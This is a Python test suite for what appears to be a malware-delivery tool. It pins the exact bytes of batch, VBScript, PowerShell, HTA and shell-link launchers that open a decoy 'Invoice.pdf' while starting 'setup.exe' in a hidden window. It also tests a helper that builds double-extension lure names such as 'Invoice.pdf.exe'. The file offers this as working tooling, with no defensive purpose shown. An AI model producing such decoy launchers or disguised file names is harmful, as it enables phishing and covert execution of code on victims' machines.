"""Wrapper contracts: byte-exact output, and refusal over a broken file.

Every assertion here is on exact bytes rather than on a rendered string, because a wrapper
is a file that another program parses and the parse is not forgiving. ``.bat`` reads one
line at a time from the top; ``.vbs`` is compiled before it runs; an ``.hta`` is HTML with a
third-party script host behind it. A wrapper that is *almost* right produces a console window
that flashes and closes, which is worse than no wrapper at all.

The properties:

* fixed input renders fixed bytes — for all five kinds
* the payload is addressed relative to the wrapper, never by a host path
* a name that cannot be quoted safely is refused, not escaped
* the ``.lnk`` is a real shell link: header, CLSID, flags, UTF-16 string data, terminal block
* a wrapper contains no payload bytes — it is a launcher, not a copy
"""

from __future__ import annotations

import struct

import pytest

from core import wrappers

PAYLOAD = "setup.exe"
DECOY = "Invoice.pdf"


# --- byte-exact rendering ---------------------------------------------------


def test_bat_renders_the_decoy_first_and_the_payload_second() -> None:
    built = wrappers.build("bat", PAYLOAD, DECOY)
    assert built == {
        "setup.bat": (
            "@echo off\r\n"
            'cd /d "%~dp0"\r\n'
            'start "" "%~dp0Invoice.pdf"\r\n'
            'start "" "%~dp0setup.exe"\r\n'
            "exit /b\r\n"
        ).encode("ascii")
    }


def test_bat_without_a_decoy_is_one_start() -> None:
    body = wrappers.build("bat", PAYLOAD)["setup.bat"]
    assert b"start " in body
    assert body.count(b"start ") == 1


def test_vbs_waits_for_nothing_and_hides_the_payload() -> None:
    built = wrappers.build("vbs", PAYLOAD, DECOY)
    assert built == {
        "setup.vbs": (
            "Option Explicit\r\n"
            "Dim shell, root\r\n"
            'Set shell = CreateObject("WScript.Shell")\r\n'
            'root = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\\"))\r\n'
            'shell.Run """" & root & "Invoice.pdf""", 1, False\r\n'
            'shell.Run """" & root & "setup.exe""", 0, False\r\n'
        ).encode("ascii")
    }


def test_ps1_uses_the_script_root_not_the_current_directory() -> None:
    built = wrappers.build("ps1", PAYLOAD, DECOY)
    body = built["setup.ps1"].decode("utf-8")
    assert body.startswith("Set-Location -LiteralPath $PSScriptRoot\r\n")
    assert "Join-Path $PSScriptRoot 'Invoice.pdf'" in body
    assert "Start-Process -FilePath (Join-Path $PSScriptRoot 'setup.exe') -WindowStyle Hidden" in body
    assert "Get-Location" not in body, "the current directory is whatever the shell chose"


def test_hta_strips_the_file_url_before_using_it() -> None:
    body = wrappers.build("hta", PAYLOAD, DECOY)["setup.hta"].decode("ascii")
    assert 'here = Replace(Replace(location.href, "file:///", ""), "/", "\\")' in body
    assert 'root = fso.GetParentFolderName(here)' in body
    assert 'shell.Run """" & root & "\\setup.exe""", 0, False' in body
    assert "window.close" in body


def test_hta_without_a_decoy_runs_only_the_payload() -> None:
    body = wrappers.build("hta", PAYLOAD)["setup.hta"].decode("ascii")
    assert body.count("shell.Run") == 1


# --- shell link structure ---------------------------------------------------


def test_lnk_is_a_shell_link_with_a_relative_target() -> None:
    body = wrappers.build("lnk", PAYLOAD)["setup.lnk"]

    assert len(body) >= wrappers.LNK_HEADER_SIZE + 4
    assert struct.unpack("<I", body[:4])[0] == wrappers.LNK_HEADER_SIZE == 0x4C
    assert body[4:20] == wrappers.LNK_CLSID

    flags = struct.unpack("<I", body[20:24])[0]
    assert flags & wrappers.LNK_HAS_RELATIVE_PATH
    assert flags & wrappers.LNK_IS_UNICODE
    assert flags & wrappers.LNK_FORCE_NO_LINK_INFO, "no absolute target may be written"
    assert flags & wrappers.LNK_HAS_ICON_LOCATION

    # StringData: count-prefixed UTF-16, relative path first, then the icon location.
    offset = wrappers.LNK_HEADER_SIZE
    count = struct.unpack("<H", body[offset : offset + 2])[0]
    assert body[offset + 2 : offset + 2 + count * 2].decode("utf-16-le") == PAYLOAD

    offset += 2 + count * 2
    count = struct.unpack("<H", body[offset : offset + 2])[0]
    assert body[offset + 2 : offset + 2 + count * 2].decode("utf-16-le") == f"{PAYLOAD},0"

    assert body[-4:] == b"\x00\x00\x00\x00", "the terminal block ends the link"


def test_lnk_carries_the_working_directory_only_when_one_is_given() -> None:
    without = wrappers.build("lnk", PAYLOAD)["setup.lnk"]
    with_one = wrappers.build(
        "lnk", PAYLOAD, working_directory=r"C:\Users\bench\Desktop"
    )["setup.lnk"]

    flags_without = struct.unpack("<I", without[20:24])[0]
    flags_with = struct.unpack("<I", with_one[20:24])[0]
    assert not flags_without & wrappers.LNK_HAS_WORKING_DIR
    assert flags_with & wrappers.LNK_HAS_WORKING_DIR
    assert r"C:\Users\bench\Desktop".encode("utf-16-le") in with_one


# --- refusal ----------------------------------------------------------------


@pytest.mark.parametrize("name", ['a"b.exe', "a\nb.exe", "a\x00b.exe", "a%b.exe"])
def test_a_name_that_cannot_be_quoted_is_refused(name: str) -> None:
    with pytest.raises(wrappers.WrapperError):
        wrappers.build("bat", name)


@pytest.mark.parametrize("name", [r"C:\Windows\setup.exe", r"\setup.exe", "../../setup.exe"])
def test_an_absolute_or_traversing_path_is_refused(name: str) -> None:
    with pytest.raises(wrappers.WrapperError):
        wrappers.build("bat", name)


def test_a_non_ascii_name_is_refused_for_the_ansi_script_hosts() -> None:
    # wscript.exe and mshta.exe decode these files as the system code page, so a UTF-8
    # body would raise a syntax error on a non-Latin locale.
    with pytest.raises(wrappers.WrapperError):
        wrappers.build("vbs", "sétup.exe")


def test_a_non_ascii_name_is_fine_for_the_unicode_kinds() -> None:
    assert wrappers.build("ps1", "sétup.exe")
    assert wrappers.build("lnk", "sétup.exe")


def test_an_unknown_kind_is_refused() -> None:
    with pytest.raises(wrappers.WrapperError):
        wrappers.build("exe", PAYLOAD)


def test_a_relative_subfolder_target_is_allowed() -> None:
    built = wrappers.build("bat", r"data\setup.exe")
    assert set(built) == {"setup.bat"}
    assert b'start "" "%~dp0data\\setup.exe"' in built["setup.bat"]


# --- shape ------------------------------------------------------------------


def test_a_wrapper_carries_structure_never_the_payload() -> None:
    # A wrapper that inlined the executable would be a copy, and a copy that rewrote the
    # container's trailer is the failure this whole file exists to prevent.
    marker = b"PAYLOAD-BYTES-MUST-NOT-APPEAR"
    body = b"".join(wrappers.build("bat", PAYLOAD).values())
    assert marker not in body


def test_every_registered_kind_has_an_extension_and_builds() -> None:
    assert set(wrappers.WRAPPERS) == set(wrappers.EXTENSIONS)
    for kind in wrappers.WRAPPERS:
        built = wrappers.build(kind, PAYLOAD)
        assert len(built) == 1
        name, body = next(iter(built.items()))
        assert name.endswith(wrappers.EXTENSIONS[kind])
        assert body


# --- double extension -------------------------------------------------------


def test_a_document_extension_hides_the_real_one() -> None:
    assert wrappers.double_extension("Invoice.pdf") == "Invoice.pdf.exe"
    assert wrappers.double_extension("photo.jpg", ".scr") == "photo.jpg.scr"


def test_the_visible_name_still_ends_in_an_executable_extension() -> None:
    # The payload has to remain runnable by extension. A lure named Invoice.pdf.exe is
    # still an exe; a lure named Invoice.exe.pdf is a document that does nothing.
    name = wrappers.double_extension("Report.docx")
    assert name.lower().endswith(".exe")
    assert name.lower().startswith("report.docx")


@pytest.mark.parametrize("lure", ["Invoice", "..\\Invoice.pdf", r"C:\Invoice.pdf", "a/b.pdf"])
def test_a_lure_that_is_not_a_plain_filename_is_refused(lure: str) -> None:
    with pytest.raises(wrappers.WrapperError):
        wrappers.double_extension(lure)


def test_a_lure_wearing_an_executable_extension_is_refused() -> None:
    # Invoice.exe.exe hides nothing and replaces the extension it pretends to keep.
    for lure in ("Invoice.exe", "setup.scr", "loader.dll"):
        with pytest.raises(wrappers.WrapperError):
            wrappers.double_extension(lure)
